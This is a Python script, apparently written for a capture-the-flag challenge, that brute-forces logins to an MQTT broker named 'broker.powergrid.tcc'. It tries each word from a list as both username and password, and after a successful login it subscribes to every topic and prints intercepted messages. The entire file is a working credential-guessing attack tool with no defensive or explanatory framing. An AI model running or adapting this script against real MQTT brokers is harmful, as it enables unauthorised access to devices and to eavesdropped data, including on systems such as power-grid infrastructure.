# mqtt_brute_fixed.py
import time, random, string, sys
from threading import Event
import paho.mqtt.client as mqtt

HOST = "broker.powergrid.tcc"
PORT = 1883
CONNECT_TIMEOUT = 4.0
MSG_WAIT = 2.0
with open("common.txt", "r") as f:
    creds = [line.strip() for line in f if line.strip()]

def try_creds(up):
    connect_event = Event()
    message_event = Event()
    rc_holder = {"rc": None}
    msg_preview = {"topic": None, "payload": None}

    cid = "ctf-" + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

    def on_connect(client, userdata, flags, rc):
        rc_holder["rc"] = rc
        if rc == 0:
            client.subscribe("#", qos=0)
        connect_event.set()

    def on_message(client, userdata, msg):
        msg_preview["topic"] = msg.topic
        try:
            msg_preview["payload"] = msg.payload.decode("utf-8", errors="replace")
        except Exception:
            msg_preview["payload"] = repr(msg.payload[:120])
        message_event.set()
        client.disconnect()

    client = mqtt.Client(client_id=cid, protocol=mqtt.MQTTv311, clean_session=True)
    if up:
        client.username_pw_set(up, up)

    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(HOST, PORT, keepalive=30)
    except Exception as e:
        print(f"[!] Connection error for {up}:{up} -> {e}")
        return False, None

    client.loop_start()
    connected = connect_event.wait(CONNECT_TIMEOUT)
    if not connected:
        client.loop_stop()
        return False, None

    rc = rc_holder["rc"]
    if rc != 0:
        client.loop_stop()
        return False, rc

    got_msg = message_event.wait(MSG_WAIT)
    client.loop_stop()

    if got_msg:
        tp = msg_preview["topic"]
        pl = msg_preview["payload"]
        print(f"[+] SUCCESS {up}:{up} -> sample: {tp} {pl[:200]!r}")
        return True, rc
    else:
        print(f"[i] Auth ok for {up}:{up} (rc={rc}) but no $SYS messages within {MSG_WAIT}s")
        return True, rc

if __name__ == "__main__":
    for name in creds:
        print(f"[*] Trying {name}:{name}")
        ok, rc = try_creds(name)
        if ok:
            print(f"\n[!] WIN: username='{name}' password='{name}' (rc={rc})\n")
            sys.exit(0)
    print("[-] No creds matched.")
